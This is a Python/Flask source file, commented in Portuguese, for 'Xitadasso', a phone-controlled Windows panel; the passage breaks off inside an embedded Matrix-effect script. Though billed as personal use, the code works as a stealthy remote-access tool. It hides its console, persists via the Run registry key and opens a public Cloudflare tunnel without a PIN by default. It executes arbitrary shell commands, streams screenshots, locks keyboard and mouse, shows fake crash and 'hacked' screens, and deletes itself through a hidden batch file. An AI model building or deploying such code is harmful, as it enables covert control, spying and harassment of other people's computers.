"""
Xitadasso - painel de testes com site local (LAN) ou publico (fora de casa via Cloudflare).
Uso pessoal, apenas no seu proprio computador (Windows).

Requisitos para rodar direto com Python: pip install flask pillow

Para gerar o exe SEM janela de CMD:
    pip install flask pillow pyinstaller
    pyinstaller --noconsole --onefile --name menu painel.py
"""
import io
import os
import re
import sys
import json
import time
import base64
import socket
import ctypes
import random
import string
import secrets
import logging
import tempfile
import threading
import subprocess
import webbrowser
import urllib.request

try:
    import winreg
except Exception:
    winreg = None

from flask import Flask, Response, jsonify, request, session

try:
    from PIL import ImageGrab
except Exception:
    ImageGrab = None

# ---------- modo furtivo (sem CMD aparecendo) ----------
ABRIR_NAVEGADOR_NO_PC = False
CREATE_NO_WINDOW = 0x08000000 if os.name == "nt" else 0

if sys.stdout is None:
    sys.stdout = open(os.devnull, "w")
if sys.stderr is None:
    sys.stderr = open(os.devnull, "w")
logging.getLogger("werkzeug").setLevel(logging.ERROR)


def esconder_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


def executar(args, **kw):
    kw.setdefault("stdin", subprocess.DEVNULL)
    kw.setdefault("creationflags", CREATE_NO_WINDOW)
    return subprocess.run(args, **kw)


class PONTO(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]


app = Flask(__name__)
app.secret_key = secrets.token_hex(16)


# ---------- config / pasta base ----------

def pasta_base():
    if getattr(sys, "frozen", False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))

ARQ_CONFIG = os.path.join(pasta_base(), "xitadasso_config.json")

CONFIG_PADRAO = {
    "pin": None,
    "modo": "lan",
    "msg_padrao": "Voce foi hackeado!",
}


def carregar_config():
    cfg = dict(CONFIG_PADRAO)
    try:
        with open(ARQ_CONFIG, "r", encoding="utf-8") as f:
            dados = json.load(f)
            if isinstance(dados, dict):
                cfg.update({k: dados[k] for k in CONFIG_PADRAO if k in dados})
    except Exception:
        pass
    if cfg.get("modo") not in ("lan", "wan"):
        cfg["modo"] = "lan"
    return cfg


def salvar_config():
    try:
        with open(ARQ_CONFIG, "w", encoding="utf-8") as f:
            json.dump(ESTADO, f, ensure_ascii=False, indent=2)
    except Exception:
        pass


ESTADO = carregar_config()


def autenticado():
    return not ESTADO["pin"] or session.get("ok") is True


def exigir_auth():
    if not autenticado():
        return jsonify(erro="nao autenticado"), 401
    return None


def ip_local():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


def log_seguro(*args):
    try:
        print(*args)
    except Exception:
        pass


# ---------- autostart com Windows ----------

REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_NOME = "Xitadasso"


def autostart_ativo():
    if winreg is None:
        return False
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_READ) as k:
            winreg.QueryValueEx(k, REG_NOME)
            return True
    except FileNotFoundError:
        return False
    except Exception:
        return False


def set_autostart(ativo):
    if winreg is None:
        return False
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_SET_VALUE) as k:
            if ativo:
                if getattr(sys, "frozen", False):
                    cmd = f'"{sys.executable}"'
                else:
                    pyw = sys.executable.replace("python.exe", "pythonw.exe")
                    if os.path.exists(pyw):
                        cmd = f'"{pyw}" "{os.path.abspath(__file__)}"'
                    else:
                        cmd = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
                winreg.SetValueEx(k, REG_NOME, 0, winreg.REG_SZ, cmd)
            else:
                try:
                    winreg.DeleteValue(k, REG_NOME)
                except FileNotFoundError:
                    pass
        return True
    except Exception as e:
        log_seguro("erro autostart:", e)
        return False


# ---------- tunel publico (Cloudflare) ----------

TUNEL = {"proc": None, "url": None, "thread": None, "ativo": False}
CF_URL = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"


def caminho_cloudflared():
    return os.path.join(pasta_base(), "cloudflared.exe")


def baixar_cloudflared():
    destino = caminho_cloudflared()
    if os.path.exists(destino):
        return destino
    try:
        urllib.request.urlretrieve(CF_URL, destino)
        return destino
    except Exception as e:
        log_seguro("erro baixando cloudflared:", e)
        return None


def _loop_tunel():
    TUNEL["url"] = "baixando cloudflared..."
    TUNEL["ativo"] = True
    cf = baixar_cloudflared()
    if not cf:
        TUNEL["url"] = "ERRO: nao consegui baixar o cloudflared"
        TUNEL["ativo"] = False
        return
    TUNEL["url"] = "iniciando tunel..."
    try:
        proc = subprocess.Popen(
            [cf, "tunnel", "--url", "http://localhost:5000", "--no-autoupdate"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL, text=True, bufsize=1,
            creationflags=CREATE_NO_WINDOW,
        )
        TUNEL["proc"] = proc
        url_re = re.compile(r"https://[a-z0-9-]+\.trycloudflare\.com")
        for linha in proc.stdout:
            m = url_re.search(linha)
            if m:
                TUNEL["url"] = m.group(0)
                TUNEL["ativo"] = True
                log_seguro("Tunel ativo:", TUNEL["url"])
                break
        for _ in proc.stdout:
            pass
    except Exception as e:
        log_seguro("erro tunel:", e)
        TUNEL["url"] = "ERRO: " + str(e)
        TUNEL["ativo"] = False


def parar_tunel():
    proc = TUNEL.get("proc")
    TUNEL["proc"] = None
    TUNEL["ativo"] = False
    TUNEL["url"] = None
    if proc is not None:
        try:
            executar(["taskkill", "/PID", str(proc.pid), "/T", "/F"], capture_output=True)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass


def iniciar_tunel_async():
    if TUNEL["ativo"] or (TUNEL["thread"] and TUNEL["thread"].is_alive()):
        return
    TUNEL["ativo"] = True
    TUNEL["url"] = "iniciando..."
    TUNEL["thread"] = threading.Thread(target=_loop_tunel, daemon=True)
    TUNEL["thread"].start()


# ---------- auto-delete (BYPASS) ----------

def agendar_autodelete():
    if not getattr(sys, "frozen", False):
        return False
    exe = sys.executable
    cf = caminho_cloudflared()
    bat = os.path.join(tempfile.gettempdir(), "xitadasso_cleanup.bat")
    linhas = [
        "@echo off",
        ":waitloop",
        "timeout /t 1 /nobreak >nul 2>&1",
        f'del /f /q "{exe}" >nul 2>&1',
        f'if exist "{exe}" goto waitloop',
        f'del /f /q "{cf}" >nul 2>&1',
        'del /f /q "%~f0" >nul 2>&1',
    ]
    try:
        with open(bat, "w", encoding="utf-8") as f:
            f.write("\r\n".join(linhas))
    except Exception as e:
        log_seguro("erro criando bat:", e)
        return False
    DETACHED_PROCESS = 0x00000008
    try:
        subprocess.Popen(
            ["cmd", "/c", bat],
            creationflags=CREATE_NO_WINDOW | DETACHED_PROCESS,
            stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            close_fds=True,
        )
        return True
    except Exception as e:
        log_seguro("erro agendando autodelete:", e)
        return False


# ---------- pagina ----------

PAGINA = """
<!doctype html>
<html lang="pt-br">
<head>
<meta charset="utf-8">
<title>Xitadasso</title>
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<style>
:root{--bg:#0a0a0d;--panel:#101015;--line:#1d1d25;--fg:#e9e9f0;--mut:#8b8b99;--acc:#7c00f0;--acc2:#9a3cff;color-scheme:dark}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--fg);font:14px/1.4 system-ui,sans-serif;padding:env(safe-area-inset-top) 0 env(safe-area-inset-bottom)}
.app{display:grid;grid-template-columns:190px 1fr;min-height:100vh}
aside{background:var(--panel);border-right:1px solid var(--line);padding:16px 12px;display:flex;flex-direction:column;gap:6px}
.logo{padding:2px 4px 16px;font-weight:800;font-size:20px;letter-spacing:1px;display:flex;align-items:center;gap:6px}
.logoimg{width:100%;max-width:100%;height:auto;display:block}
aside h6{margin:10px 0 2px 4px;font-size:12px;color:var(--mut);font-weight:600}
.nav{border:0;background:none;color:var(--fg);text-align:left;padding:9px 12px;border-radius:8px;font:inherit;cursor:pointer}
.nav.on{background:var(--acc);font-weight:600}
main{padding:16px;display:grid;gap:14px;align-content:start}
.tabs{display:none;background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:3px}
.tab{flex:1;border:0;background:none;color:var(--fg);padding:8px 10px;border-radius:8px;font:inherit;cursor:pointer}
.tab.on{background:var(--acc);font-weight:600}
.cards{display:grid;gap:14px;grid-template-columns:repeat(auto-fit,minmax(260px,1fr))}
.card{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:14px;display:flex;flex-direction:column;gap:12px}
.card h3{margin:0;font-size:14px}
.row{display:flex;justify-content:space-between;align-items:center;gap:10px}
.hint{color:var(--mut);font-size:12px}
input[type=text],input[type=password],input[type=number]{background:#1a1a20;color:var(--fg);border:1px solid var(--line);border-radius:6px;padding:9px;font:inherit;width:100%}
select{background:#1a1a20;color:var(--fg);border:1px solid var(--line);border-radius:6px;padding:6px;font:inherit}
.btn{border:0;background:var(--acc);color:#fff;padding:10px 14px;border-radius:8px;font:inherit;font-weight:600;cursor:pointer;white-space:normal;text-align:center}
.btn small{display:block;font-weight:400;font-size:11px;opacity:.85;margin-top:2px}
.btn:hover{background:var(--acc2)}
.btn.outline{background:none;border:1px solid var(--line)}
.btn.outline:hover{background:#1a1a20}
.btn.block{width:100%}
.btn.on{background:var(--acc2);box-shadow:0 0 0 2px var(--acc2) inset,0 0 12px rgba(154,60,255,.4)}
.grid-btns{display:grid;gap:8px;grid-template-columns:1fr 1fr}
#term{background:#000;color:#21ff5a;font:12px/1.5 ui-monospace,Consolas,monospace;border:1px solid var(--line);border-radius:12px;padding:10px;height:220px;overflow:auto;white-space:pre-wrap}
.cmdrow{display:flex;gap:8px}
.warn{background:#2a1a00;border:1px solid #7a4a00;color:#ffd08a;border-radius:8px;padding:10px;font-size:12px;line-height:1.5}
.danger{background:#2a0000;border:1px solid #7a0000;color:#ff9a9a}
.ipbox{font:13px ui-monospace,Consolas,monospace;color:var(--acc2);background:#0b0b10;border-radius:8px;padding:8px 10px;word-break:break-all}
.modal-bg{display:none;position:fixed;inset:0;background:rgba(0,0,0,.75);align-items:center;justify-content:center;z-index:10}
.modal{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:22px;width:280px;text-align:center}
.modal input{margin:10px 0;text-align:center}
.lock{position:fixed;inset:0;background:var(--bg);display:flex;align-items:center;justify-content:center;z-index:20}
.lockbox{width:260px;text-align:center}
@media(max-width:700px){.app{grid-template-columns:1fr}aside{display:none}main{padding:12px}.tabs{display:flex}}
.hid{display:none!important}
</style>
</head>
<body>
<div class="app">
  <aside>
    <div class="logo"><img class="logoimg" src="/logo.png" alt="XITADASSO" onerror="this.outerHTML='<span style=color:#fff>XITA</span><span style=color:#9a3cff>DASSO</span>'"></div>
    <h6>Controle</h6>
    <button class="nav on" data-p="a">Comandos</button>
    <button class="nav" data-p="b">Terminal</button>
    <h6>Config</h6>
    <button class="nav" data-p="c">Sistema</button>
  </aside>
  <main>
    <div class="tabs">
      <button class="tab on" data-p="a">Comandos</button>
      <button class="tab" data-p="b">Terminal</button>
      <button class="tab" data-p="c">Sistema</button>
    </div>

    <div class="cards" id="pa">
      <div class="card">
        <h3>Acoes rapidas</h3>
        <div class="grid-btns">
          <button class="btn" onclick="rodar('terminal_hacker')">Terminal hacker</button>
          <button class="btn" onclick="abrirAbas()">Abrir abas</button>
          <button class="btn" onclick="rodar('monitor_off')">Desligar monitor</button>
        </div>
      </div>
      <div class="card">
        <h3>Telas cheias no PC</h3>
        <div class="grid-btns">
          <button class="btn" onclick="rodar('efeito_pc',{nome:'hacker'})">Hacker na tela</button>
          <button class="btn" onclick="rodar('efeito_pc',{nome:'matrix'})">Matrix</button>
          <button class="btn" onclick="rodar('efeito_pc',{nome:'bsod'})">Tela azul</button>
          <button class="btn outline" onclick="rodar('fechar_efeito')">Fechar efeito</button>
        </div>
      </div>

      <div class="card">
        <h3>Minha Tela</h3>
        <span class="hint">Ve a tela do seu PC pelo celular.</span>
        <div class="grid-btns">
          <button class="btn" id="btnTela" onclick="alternarTela()">Ver minha tela</button>
        </div>
        <div id="telaOpts" style="display:none;margin-top:8px;gap:8px;flex-direction:column">
          <div class="row">
            <span class="hint">Qualidade</span>
            <select id="telaQ" onchange="telaQualidade=+this.value">
              <option value="25">Baixa (mais rapido)</option>
              <option value="40" selected>Media</option>
              <option value="60">Alta</option>
              <option value="80">Maxima</option>
            </select>
          </div>
          <div class="row">
            <span class="hint">Resolucao</span>
            <select id="telaW" onchange="telaLargura=+this.value">
              <option value="640">640 (rapido)</option>
              <option value="960" selected>960 (padrao)</option>
              <option value="1280">1280 (nitido)</option>
            </select>
          </div>
        </div>
        <div id="telaWrap" style="display:none;margin-top:10px">
          <img id="telaImg" style="width:100%;border-radius:8px;border:1px solid #2a2a38">
          <span class="hint" id="telaStatus"></span>
        </div>
      </div>

      <div class="card">
        <h3>Mexer no PC</h3>
        <div class="grid-btns">
          <button class="btn" onclick="rodar('digitar_notepad')">Digitar sozinho</button>
          <button class="btn" onclick="rodar('capslock_blink')">Piscar Caps Lock</button>
          <button class="btn" onclick="rodar('mouse_maluco')">Mouse maluco</button>
          <button class="btn" onclick="rodar('sirene')">Sirene</button>
        </div>
      </div>
      <div class="card">
        <h3>Mensagens</h3>
        <input id="msgTexto" type="text" maxlength="200">
        <div class="grid-btns">
          <button class="btn" onclick="salvarMsg()">Salvar texto</button>
          <button class="btn outline" onclick="restaurarMsg()">Restaurar</button>
        </div>
        <div class="grid-btns">
          <button class="btn" onclick="rodar('falar',{texto:$('#msgTexto').value})">Falar</button>
          <button class="btn" onclick="rodar('popup',{texto:$('#msgTexto').value})">Pop-up</button>
        </div>
      </div>
      <div class="card">
        <h3>Trancar PC</h3>
        <div class="row"><span class="hint">Destrava sozinho em (segundos):</span><input id="segTrava" type="number" value="300" min="5" max="3600" style="width:90px"></div>
        <div class="grid-btns">
          <button class="btn" onclick="rodar('trancar',{segundos:$('#segTrava').value})">Trancar</button>
          <button class="btn outline" onclick="rodar('destrancar')">Destrancar</button>
        </div>
        <span class="hint">Bloqueia teclado e mouse do PC. Voce continua controlando pelo celular.</span>
      </div>
      <div class="card">
        <h3>Encerrar</h3>
        <div class="grid-btns">
          <button class="btn outline" onclick="fecharMenu()">Fechar Menu</button>
          <button class="btn" onclick="bypass()">BYPASS</button>
        </div>
        <span class="hint">"Fechar Menu" so encerra. "BYPASS" faz o teatro do hacker e <b>apaga o proprio .exe</b> automaticamente.</span>
      </div>
      <div class="card">
        <h3>Energia</h3>
        <div class="grid-btns">
          <button class="btn" onclick="abrirModal('desligar')">Desligar PC</button>
          <button class="btn" onclick="abrirModal('reiniciar')">Reiniciar PC</button>
        </div>
        <button class="btn outline block" onclick="rodar('cancelar')">Cancelar desligamento</button>
      </div>
    </div>

    <div class="cards hid" id="pb">
      <div class="card" style="grid-column:1/-1">
        <h3>Terminal</h3>
        <div id="term">Aguardando comandos...\n</div>
        <div class="cmdrow">
          <input id="cmdInput" type="text" placeholder="Comando do Windows..." onkeydown="if(event.key==='Enter')rodarComando()">
          <button class="btn" onclick="rodarComando()">Executar</button>
          <button class="btn outline" id="btnCancelar" onclick="cancelarComando()" disabled>Cancelar</button>
        </div>
      </div>
    </div>

    <div class="cards hid" id="pc">
      <div class="card" style="grid-column:1/-1">
        <h3>Modo de acesso</h3>
        <span class="hint">Escolha como quer controlar este PC. Fica salvo pra proxima vez que abrir.</span>
        <div class="grid-btns">
          <button class="btn outline" id="btnModoLan" onclick="setModo('lan')">
            <b>Wi-Fi local (LAN)</b>
            <small>So funciona na mesma rede Wi-Fi</small>
          </button>
          <button class="btn outline" id="btnModoWan" onclick="setModo('wan')">
            <b>Fora de casa (publico)</b>
            <small>Link Cloudflare, funciona de qualquer rede</small>
          </button>
        </div>
        <div class="warn hid" id="wanAviso">
          <b>Atencao:</b> voce esta usando acesso publico. <b>Defina um PIN</b> abaixo pra ninguem na internet controlar seu PC.
        </div>
        <div class="ipbox hid" id="tunelBox"></div>
        <span class="hint" id="tunelStatus"></span>
      </div>

      <div class="card">
        <h3>Inicializacao</h3>
        <span class="hint">Liga o Xitadasso junto com o Windows (com o modo escolhido).</span>
        <button class="btn block outline" id="btnAuto" onclick="toggleAuto()">Iniciar com Windows: DESATIVADO</button>
      </div>

      <div class="card">
        <h3>Acesso na mesma Wi-Fi</h3>
        <span class="hint">Use este endereco no navegador do celular (mesma rede Wi-Fi):</span>
        <div class="ipbox" id="ipShow">carregando...</div>
      </div>

      <div class="card">
        <h3>PIN de seguranca</h3>
        <div class="warn hid" id="pinWarn">Sem PIN: qualquer aparelho nessa rede (ou na internet, em modo publico) pode controlar este PC.</div>
        <input id="pinIn" type="password" placeholder="Definir um PIN (4 a 32 caracteres)">
        <div class="grid-btns">
          <button class="btn" onclick="definirPin()">Definir PIN</button>
          <button class="btn outline" onclick="removerPin()">Remover PIN</button>
        </div>
      </div>
    </div>
  </main>
</div>

<div class="modal-bg" id="modalBg">
  <div class="modal">
    <div id="modalTitulo">Confirmar acao</div>
    <input type="number" id="segundos" value="30" min="5">
    <div class="hint">segundos</div>
    <button class="btn" onclick="confirmarAcao()">Confirmar</button>
    <button class="btn outline" onclick="fecharModal()">Cancelar</button>
  </div>
</div>

<div class="lock hid" id="lockScreen">
  <div class="lockbox">
    <div class="logo" style="justify-content:center"><img class="logoimg" src="/logo.png" alt="XITADASSO"></div>
    <p class="hint">Este painel esta protegido por PIN.</p>
    <input type="password" id="lockPin" placeholder="PIN">
    <button class="btn block" onclick="entrarPin()">Entrar</button>
  </div>
</div>

<script>
const $=s=>document.querySelector(s),$$=s=>[...document.querySelectorAll(s)];
function show(p){["a","b","c"].forEach(x=>$("#p"+x).classList.toggle("hid",x!==p));$$(".tab,.nav").forEach(b=>b.classList.toggle("on",b.dataset.p===p))}
$$(".tab,.nav").forEach(b=>b.onclick=()=>show(b.dataset.p));

const consoleDiv=$("#term");
function log(txt){consoleDiv.textContent+=txt+"\\n";consoleDiv.scrollTop=consoleDiv.scrollHeight}

async function rodar(acao,dados){
  show('b');
  log("> executando: "+acao);
  const r=await fetch('/api/'+acao,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(dados||{})});
  if(r.status===401){mostrarLock();return}
  const j=await r.json();
  log(j.saida||j.erro||"ok");
}

function abrirAbas(){
  const links=prompt("Cole os links separados por espaco:","https://www.google.com https://www.wikipedia.org");
  if(links===null)return;
  rodar('abrir_abas',{links:links});
}

const pausa=ms=>new Promise(r=>setTimeout(r,ms));
async function encerrarPrograma(passos, deletar){
  show('b');
  for(const p of passos){log(p);await pausa(700)}
  const endpoint = deletar ? '/api/bypass' : '/api/fechar_menu';
  const r=await fetch(endpoint,{method:'POST'}).catch(()=>null);
  if(r&&r.status===401){log("[ERRO] sessao expirada - o programa NAO fechou.");mostrarLock();return}
  if(!r){log("[ERRO] nao consegui falar com o programa.");return}
  log(deletar ? "[OK] Encerrando e apagando o Xitadasso..." : "[OK] Encerrando o Xitadasso...");
  for(let i=0;i<20;i++){
    await pausa(400);
    try{await fetch('/api/state',{cache:'no-store'})}
    catch(e){
      const extra = deletar ? '<br><small style="margin-top:8px;display:block">O .exe foi removido automaticamente.</small>' : '';
      document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;text-align:center;color:#8b8b99;font:16px system-ui">Conexao encerrada.<br>Xitadasso desligado.'+extra+'</div>';
      return;
    }
  }
}

// ----- Minha Tela (streaming adaptativo) -----
let telaAtiva = false, telaTimer = null, telaEmVoo = false;
let telaQualidade = 40, telaLargura = 960;
const TELA_CICLO = 500;

function alternarTela(){
  telaAtiva = !telaAtiva;
  $('#btnTela').textContent = telaAtiva ? 'Parar' : 'Ver minha tela';
  $('#telaWrap').style.display = telaAtiva ? 'block' : 'none';
  $('#telaOpts').style.display = telaAtiva ? 'flex' : 'none';
  if(telaAtiva){
    atualizarTela();
  }else{
    clearTimeout(telaTimer);
    telaEmVoo = false;
    $('#telaStatus').textContent = '';
  }
}

async function atualizarTela(){
  if(!telaAtiva) return;
  if(telaEmVoo){ telaTimer = setTimeout(atualizarTela, 120); return; }
  if(document.hidden){ telaTimer = setTimeout(atualizarTela, 800); return; }

  telaEmVoo = true;
  const img = $('#telaImg');
  const t0 = performance.now();
  try{
    const r = await fetch(`/api/tela.jpg?q=${telaQualidade}&w=${telaLargura}&t=${Date.now()}`,{cache:'no-store'});
    if(r.status===401){ mostrarLock(); telaAtiva=false; telaEmVoo=false; return; }
    if(!r.ok) throw 0;
    const blob = await r.blob();
    const url = URL.createObjectURL(blob);
    const antiga = img.src;
    img.src = url;
    img.onload = ()=>{ if(antiga && antiga.startsWith('blob:')) URL.revokeObjectURL(antiga); };
    $('#telaStatus').textContent = '';
  }catch(e){
    $('#telaStatus').textContent = 'sem sinal...';
  }
  const dt = performance.now() - t0;
  telaEmVoo = false;
  const espera = Math.max(60, TELA_CICLO - dt);
  telaTimer = setTimeout(atualizarTela, espera);
}

document.addEventListener('visibilitychange', ()=>{
  if(!document.hidden && telaAtiva && !telaEmVoo){
    clearTimeout(telaTimer);
    atualizarTela();
  }
});

function fecharMenu(){ encerrarPrograma(["[*] Encerrando o Xitadasso..."], false); }
function bypass(){
  encerrarPrograma([
    "[*] BYPASS iniciado...",
    "[+] Rastreando invasor... 192.168.0.666",
    "[+] Revertendo payload...",
    "[+] Expulsando o hacker...",
    "[+] Removendo arquivos deixados pelo invasor..."
  ], true);
}

let acaoModal=null;
function abrirModal(acao){
  acaoModal=acao;
  $("#modalTitulo").textContent=acao==='desligar'?'Desligar PC em quantos segundos?':'Reiniciar PC em quantos segundos?';
  $("#modalBg").style.display='flex';
}
function fecharModal(){$("#modalBg").style.display='none'}
function confirmarAcao(){const seg=$("#segundos").value||30;fecharModal();rodar(acaoModal,{segundos:seg})}

let comandoAtivo=null;
async function rodarComando(){
  const input=$("#cmdInput"),cmd=input.value.trim();
  if(!cmd||comandoAtivo)return;
  input.value='';
  show('b');
  log("> executando: "+cmd);
  comandoAtivo=crypto.randomUUID?crypto.randomUUID():String(Date.now());
  $("#btnCancelar").disabled=false;
  const id=comandoAtivo;
  const r=await fetch('/api/shell',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({comando:cmd,id:id})});
  if(comandoAtivo!==id)return;
  comandoAtivo=null;
  $("#btnCancelar").disabled=true;
  if(r.status===401){mostrarLock();return}
  const j=await r.json();
  log(j.saida||j.erro||"ok");
}
async function cancelarComando(){
  if(!comandoAtivo)return;
  const id=comandoAtivo;
  comandoAtivo=null;
  $("#btnCancelar").disabled=true;
  log("> cancelando...");
  await fetch('/api/shell_cancelar',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:id})});
  log("comando cancelado.");
}

async function definirPin(){
  const pin=$("#pinIn").value.trim();
  if(pin.length<4){alert("O PIN precisa ter pelo menos 4 caracteres.");return}
  const r=await fetch('/api/pin',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({pin})});
  if(r.ok){$("#pinIn").value='';carregarEstado()} else alert((await r.json()).erro||"erro")
}
async function removerPin(){
  if(!confirm("Remover o PIN? Qualquer aparelho na rede podera controlar o PC."))return;
  await fetch('/api/pin',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({pin:""})});
  carregarEstado();
}

function mostrarLock(){$("#lockScreen").classList.remove("hid")}
async function entrarPin(){
  const pin=$("#lockPin").value;
  const r=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({pin})});
  if(r.ok){$("#lockScreen").classList.add("hid");$("#lockPin").value='';carregarEstado()}
  else alert("PIN incorreto.");
}

// ----- mensagem padrao -----
let msgPadraoSalva = "Voce foi hackeado!";
async function carregarMsg(){
  try{
    const r = await fetch('/api/config');
    const j = await r.json();
    msgPadraoSalva = j.msg_padrao || "Voce foi hackeado!";
    $('#msgTexto').value = msgPadraoSalva;
  }catch(e){}
}
async function salvarMsg(){
  const t = $('#msgTexto').value;
  await fetch('/api/config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({msg_padrao:t})});
  msgPadraoSalva = t;
  log("[+] Texto padrao salvo: " + t);
}
function restaurarMsg(){ $('#msgTexto').value = msgPadraoSalva; }

// ----- autostart -----
let autoAtivo = false;
async function carregarAuto(){
  try{
    const r = await fetch('/api/autostart');
    const j = await r.json();
    autoAtivo = !!j.ativo;
    atualizarBotaoAuto();
  }catch(e){}
}
function atualizarBotaoAuto(){
  const b = $('#btnAuto');
  if(autoAtivo){
    b.innerHTML = '✓ Iniciar com Windows: <b>ATIVADO</b>';
    b.classList.remove('outline');
    b.classList.add('on');
  }else{
    b.innerHTML = 'Iniciar com Windows: DESATIVADO';
    b.classList.add('outline');
    b.classList.remove('on');
  }
}
async function toggleAuto(){
  const novo = !autoAtivo;
  const r = await fetch('/api/autostart',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ativo:novo})});
  if(r.ok){
    autoAtivo = novo;
    atualizarBotaoAuto();
    log(novo ? "[+] Autostart ATIVADO." : "[+] Autostart DESATIVADO.");
  }else alert("Nao consegui alterar o autostart.");
}

// ----- modo (lan / wan) -----
let modoAtual = 'lan';
let tunelUrl = null;
let tunelPoll = null;

async function carregarModo(){
  try{
    const r = await fetch('/api/config');
    const j = await r.json();
    modoAtual = j.modo || 'lan';
    tunelUrl = j.tunel_url || null;
    atualizarModoUI();
    if(modoAtual === 'wan' && (!tunelUrl || !tunelUrl.startsWith('http'))){
      iniciarPollTunel();
    }
  }catch(e){}
}
function atualizarModoUI(){
  const bLan = $('#btnModoLan'), bWan = $('#btnModoWan');
  const box = $('#tunelBox'), st = $('#tunelStatus'), av = $('#wanAviso');
  if(modoAtual === 'lan'){
    bLan.classList.remove('outline'); bLan.classList.add('on');
    bWan.classList.add('outline'); bWan.classList.remove('on');
    box.classList.add('hid'); box.textContent='';
    st.textContent = '';
    av.classList.add('hid');
  }else{
    bWan.classList.remove('outline'); bWan.classList.add('on');
    bLan.classList.add('outline'); bLan.classList.remove('on');
    box.classList.remove('hid');
    if(tunelUrl && tunelUrl.startsWith('http')){
      box.textContent = tunelUrl;
      st.textContent = 'Abra esse link em qualquer celular/rede.';
    }else{
      box.textContent = tunelUrl || 'iniciando...';
      st.textContent = 'Aguarde o link aparecer (10-30s na primeira vez, baixa o cloudflared).';
    }
    fetch('/api/state').then(r=>r.json()).then(j=>{
      av.classList.toggle('hid', j.pin_set);
    }).catch(()=>{});
  }
}
function iniciarPollTunel(){
  if(tunelPoll) clearInterval(tunelPoll);
  tunelPoll = setInterval(async ()=>{
    try{
      const r = await fetch('/api/config');
      const j = await r.json();
      tunelUrl = j.tunel_url;
      atualizarModoUI();
      if(tunelUrl && tunelUrl.startsWith('http')){clearInterval(tunelPoll);tunelPoll=null}
    }catch(e){}
  }, 1500);
}
async function setModo(m){
  if(m === modoAtual){
    log("[i] Ja esta em modo " + m + ".");
    return;
  }
  if(m === 'wan'){
    if(!confirm("Ativar acesso publico (fora de casa)? Vai gerar um link Cloudflare acessivel de qualquer lugar. Recomendo definir um PIN antes.")) return;
  }
  const r = await fetch('/api/modo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({modo:m})});
  if(r.status===401){mostrarLock();return}
  const j = await r.json();
  if(!r.ok){alert(j.erro||"erro");return}
  modoAtual = j.modo;
  tunelUrl = j.tunel_url || null;
  atualizarModoUI();
  if(modoAtual === 'wan'){ iniciarPollTunel(); log("[+] Modo publico ativado. Gerando link..."); }
  else { log("[+] Modo LAN ativado. Acesso so pela mesma Wi-Fi."); }
}

async function carregarEstado(){
  const r=await fetch('/api/state');
  const j=await r.json();
  $("#ipShow").textContent="http://"+j.ip+":"+j.porta;
  $("#pinWarn").classList.toggle("hid",j.pin_set);
  if(j.pin_set && !j.autenticado){mostrarLock()}else{$("#lockScreen").classList.add("hid")}
  if(modoAtual === 'wan') atualizarModoUI();
}
carregarEstado();
carregarAuto();
carregarModo();
carregarMsg();
</script>
</body>
</html>
"""

PAGINA_BSOD = """
<!doctype html>
<html lang="pt-br">
<head>
<meta charset="utf-8">
<title> </title>
<style>
body{background:#0078d7;color:#fff;font-family:'Segoe UI',Arial,sans-serif;height:100vh;margin:0;
display:flex;align-items:center;justify-content:center;flex-direction:column;text-align:center;cursor:none}
h1{font-size:100px;margin:0 0 20px}
p{font-size:20px;max-width:650px;line-height:1.6;padding:0 20px}
</style>
</head>
<body><h1>:(</h1><p>Seu PC encontrou um problema e precisa ser reiniciado.</p></body>
</html>
"""

PAGINA_MATRIX = """
<!doctype html>
<html><head><meta charset="utf-8"><title> </title>
<style>html,body{margin:0;height:100%;background:#000;overflow:hidden;cursor:none}canvas{display:block}
.msg{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;pointer-events:none}
.msg b{font:700 clamp(24px,4vw,56px)/1.1 Consolas,monospace;color:#21ff5a;text-shadow:0 0 12px #21ff5a;background:rgba(0,0,0,.65);padding:8px 18px}</style>
</head><body><canvas id="c"></canvas><div class="msg"><b>SISTEMA COMPROMETIDO</b></div>
<script>
const c=document.getElementById('c'),x=c.getContext('2d');
const chars='01ABCDEFXITADASSO#$%&@*+=<>';
const tam=18;let cols,gotas;
function iniciar(){c.width=innerWidth;c.height=innerHeight;cols=Math.floor(c.width/tam);gotas=Array.from({length:cols},()=>Math.random()*-50)}
iniciar();onresize=iniciar;
setInterval(()=>{x.fillStyle='rgba(0,0,0,.08)';x.fillRect(0,0,c.width,c.height);x.font=tam+'px monospace';
